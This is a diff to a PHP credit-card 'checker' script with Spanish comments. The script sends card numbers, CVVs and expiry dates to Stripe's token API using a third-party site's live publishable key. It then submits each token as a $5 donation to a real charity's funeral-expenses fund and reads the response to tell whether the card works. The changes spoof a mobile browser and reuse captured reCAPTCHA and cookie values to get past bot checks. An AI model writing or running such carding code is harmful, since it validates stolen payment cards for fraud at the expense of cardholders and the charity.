@@ -1904,49 +1904,80 @@ curl_close($ch);
         $postcode = $matches1[1][0];
 
 ////SACA EL TOKEN//
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
-$response = curl_exec($ch);
-$err = curl_error($ch);
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Accept: application/json',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.6',
+    'origin: https://js.stripe.com',
+    'referer: https://js.stripe.com/',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
 $json = json_decode($response, true);
 $token = $json["id"];
 $ip = $json["client_ip"];
-curl_close($ch);
+curl_close($curl);
+//echo "$token\n";
 
 //---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'g-recaptcha-response=03ANYolqtrAXy5zIt2AjPl_v86EhHB_0O8YEgRQ73dmNp0E6rS3OaDFJqwYHwDoSLyD6Z9plsGVb3XvVAqEvqVWJTNX-YDYXAx2ynIggYNEIE5ns3byzDEIOJMghcj6qkmnzTyM4nzk3XRnSeqndz8VbvON0ctHxIbblzlqdtAwfNLKyYN3Z4QvcOqK8RmrhIJNInTgDRBAXqo8cCS3hg2xlDTbuzXSS1EV4WAlTE0yIyUVAs27f63DSS4MRZL-jX8ifTCcHmDgX3sKX92atN3k3vI91QTJ8TGmPkcuWTj4xgBnktDyFxQSIPMY2yORw5d90yIDfUHQV62ZAn3TQvZ0l_psLuVhs15xrah2ZGuA-qTBuAhAM64qn8WXaw2YCXQMG1rU4RkUeYm3PvsV0_Yxq9aBzDMC7g6aySQP-1RUw2AA6Ma7yTWvhdwL7tWcs7iy6-5fWF86dIb2tBujmSMzwfr4EdOZ1PD4Q&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=funeral+expenses&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&address=true&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'');
+$curl = curl_init();
 
-$response = curl_exec($ch);
-$err = curl_error($ch);
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA79gN-cRZCqHC86fNgGHKUYB4kIXpZwh0Asad6-9xnWuLyR598WPDh3DdhVZgKmFEgqjW4Q4wLjH4ILy_rOPovVGEKpaTqejsK3jqN2lWF6AU_UZDSvSf99D3GD8mKFPb2DDKW5O3T1voJNde8qlmA6uS7DCaNMQ9snUNXkWp-hRNpCYM3F4G9FtsNH89m4Ym1ASF9slZMhfS50axXAjeTUZqjHQ0wyqWMUFo8egBpY-i0SW8jvqYoLnzwNXIQ8MKZ2jBU5VPBez8_2z_GKvhqX_Chm-uVPDiTqneR4H83cCyvnoCHB9cnnRZbZSsRA2rDNu7mys0fxmmfskLoWhNM872ppHipa0d9Cv6wZL_7ZRqmk4IpL0SNqtAfm1-LcaVJSja0ZR5ZD4hlvqteyna-rP_ypt04EkUuAt__Nf0MjSkoDSRziZDTyiIPTUpumXTbNzOId93sJlQF9ZFmCjJOEjmJs5eri9yah7_1N4y-R538eHVPvfZJeROfFyPewhTJgJ6m-t2qgbczqOhhalXpdmy3xwSpm1b6lUe4fqAb5fLgOmPEwuMSiGXIW4cTQp2X7CLYehyrGUUA6HeRjHbxELJJZFvzTfR6nrYS5W-XWAJBRNPKw45Oo4voxRVCQfJMRb2Th030Wro62n8lqduUZ2-TcNpqmm0GxywcDRiGshF9K11kQjnY4gyNmwsBf7fdjiGgPsUWzNzIbA0IPUztJDU_FoM-aU40VVQXghlsNab8PMfnHTnAVUpRrIZ-RRwPMuyKLLot2YqmwwxYyuwdbsPAZ2HkiXL6T3ypjkNWOBfxqbkmgfLQtxRnmwRnizn0ZMTyrccA_EzB01MHiAm4qheWbSteU7pt6160Va-pvpG_KTrJUxQoMCflqNIPHfuMMBtB8GQ7ND4TVHgOqPtM6t-7MyA&token='.$token.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=funeral-service-donations&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&addressStreet='.$street.'&addressApt=&addressCity='.$city.'&addressState='.$state.'&addressZipCode='.$postcode.'',
+  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
+  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
+//  CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E549B084AFBFC941618DBECF951F761AB9DF0241960432B90F895A2BFFFD4DBCE2F350BEBBA742F70A5B1CDB1D610D29AA3; __stripe_mid=27a8675f-023c-45ac-9483-16bd0a1b7b88bfab33; __stripe_sid=17eb8870-f952-48b8-b39f-f559cd90e22dde35cd',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'sec-ch-ua-platform: "Android"',
+    'Accept-Language: es-US,es;q=0.6',
+    'Origin: https://goodbricksapp.com',
+    'Referer: https://goodbricksapp.com/icsd.org/donate',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
 $json = json_decode($response, true);
+
 $respo = $json["status"];
 
 if (empty($respo)){
 $respo = explode(';', $json['message'])[0];
 }
 
-curl_close($ch);
+if (empty($respo)){
+$mensaje = preg_match('/<p>(.*?)<\/p>/', $response, $matches);
+$respo = $matches[1];
+} else {
+$respo = "Service Unavailable";
+}
+
+curl_close($curl);
 
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
